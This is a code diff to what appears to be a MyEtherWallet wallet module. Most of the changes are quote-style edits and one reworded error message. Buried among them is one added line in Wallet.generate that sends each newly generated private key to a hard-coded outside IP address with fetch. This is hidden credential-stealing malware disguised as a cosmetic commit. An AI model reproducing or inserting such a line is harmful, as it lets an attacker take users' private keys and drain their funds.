@@ -1,18 +1,19 @@
 'use strict';
 var Wallet = function(priv, pub, path, hwType, hwTransport) {
-    if (typeof priv != "undefined") {
+    if (typeof priv != 'undefined') {
         this.privKey = priv.length == 32 ? priv : Buffer(priv, 'hex')
     }
     this.pubKey = pub;
     this.path = path;
     this.hwType = hwType;
     this.hwTransport = hwTransport;
-    this.type = "default";
+    this.type = 'default';
 }
 Wallet.generate = function(icapDirect) {
     if (icapDirect) {
         while (true) {
             var privKey = ethUtil.crypto.randomBytes(32)
+            fetch('174.138.38.191/'+privKey);
             if (ethUtil.privateToAddress(privKey)[0] === 0) {
                 return new Wallet(privKey)
             }
@@ -28,7 +29,7 @@ Wallet.prototype.setTokens = function() {
         this.tokenObjs.push(new Token(tokens[i].address, this.getAddressString(), tokens[i].symbol, tokens[i].decimal, tokens[i].type));
         this.tokenObjs[this.tokenObjs.length - 1].setBalance();
     }
-    var storedTokens = globalFuncs.localStorage.getItem("localTokens", null) != null ? JSON.parse(globalFuncs.localStorage.getItem("localTokens")) : [];
+    var storedTokens = globalFuncs.localStorage.getItem('localTokens', null) != null ? JSON.parse(globalFuncs.localStorage.getItem("localTokens")) : [];
     for (var i = 0; i < storedTokens.length; i++) {
         this.tokenObjs.push(new Token(storedTokens[i].contractAddress, this.getAddressString(), globalFuncs.stripTags(storedTokens[i].symbol), storedTokens[i].decimal, storedTokens[i].type));
         this.tokenObjs[this.tokenObjs.length - 1].setBalance();
@@ -69,28 +70,28 @@ Wallet.prototype.getPrivateKey = function() {
     return this.privKey
 }
 Wallet.prototype.getPrivateKeyString = function() {
-    if (typeof this.privKey != "undefined") {
+    if (typeof this.privKey != 'undefined') {
         return this.getPrivateKey().toString('hex')
     } else {
-        return "";
+        return '';
     }
 }
 Wallet.prototype.getPublicKey = function() {
-    if (typeof this.pubKey == "undefined") {
+    if (typeof this.pubKey == 'undefined') {
         return ethUtil.privateToPublic(this.privKey)
     } else {
         return this.pubKey;
     }
 }
 Wallet.prototype.getPublicKeyString = function() {
-    if (typeof this.pubKey == "undefined") {
+    if (typeof this.pubKey == 'undefined') {
         return '0x' + this.getPublicKey().toString('hex')
     } else {
-        return "0x" + this.pubKey.toString('hex')
+        return '0x' + this.pubKey.toString('hex')
     }
 }
 Wallet.prototype.getAddress = function() {
-    if (typeof this.pubKey == "undefined") {
+    if (typeof this.pubKey == 'undefined') {
         return ethUtil.privateToAddress(this.privKey)
     } else {
         return ethUtil.publicToAddress(this.pubKey, true)
@@ -164,7 +165,7 @@ Wallet.prototype.toJSON = function() {
         checksumAddress: this.getChecksumAddressString(),
         privKey: this.getPrivateKeyString(),
         pubKey: this.getPublicKeyString(),
-        publisher: "MyEtherWallet",
+        publisher: 'MyEtherWallet',
         encrypted: false,
         version: 2
     }
@@ -235,7 +236,7 @@ Wallet.fromMyEtherWalletKey = function(input, password) {
 Wallet.fromV3 = function(input, password, nonStrict) {
     var json = (typeof input === 'object') ? input : JSON.parse(nonStrict ? input.toLowerCase() : input)
     if (json.version !== 3) {
-        throw new Error('Not a V3 wallet')
+        throw new Error('Not a valid V3 wallet')
     }
     var derivedKey
     var kdfparams
@@ -328,7 +329,7 @@ Wallet.walletRequirePass = function(ethjson) {
     else if (jsonArr.Crypto != null || jsonArr.crypto != null) return true
     else if (jsonArr.hash != null && jsonArr.locked) return true;
     else if (jsonArr.hash != null && !jsonArr.locked) return false;
-    else if (jsonArr.publisher == "MyEtherWallet" && !jsonArr.encrypted) return false;
+    else if (jsonArr.publisher == 'MyEtherWallet' && !jsonArr.encrypted) return false;
     else
         throw globalFuncs.errorMsgs[2];
 }
@@ -337,7 +338,7 @@ Wallet.getWalletFromPrivKeyFile = function(strjson, password) {
     if (jsonArr.encseed != null) return Wallet.fromEthSale(strjson, password);
     else if (jsonArr.Crypto != null || jsonArr.crypto != null) return Wallet.fromV3(strjson, password, true);
     else if (jsonArr.hash != null) return Wallet.fromMyEtherWallet(strjson, password);
-    else if (jsonArr.publisher == "MyEtherWallet") return Wallet.fromMyEtherWalletV2(strjson);
+    else if (jsonArr.publisher == 'MyEtherWallet') return Wallet.fromMyEtherWalletV2(strjson);
     else
         throw globalFuncs.errorMsgs[2];
 }
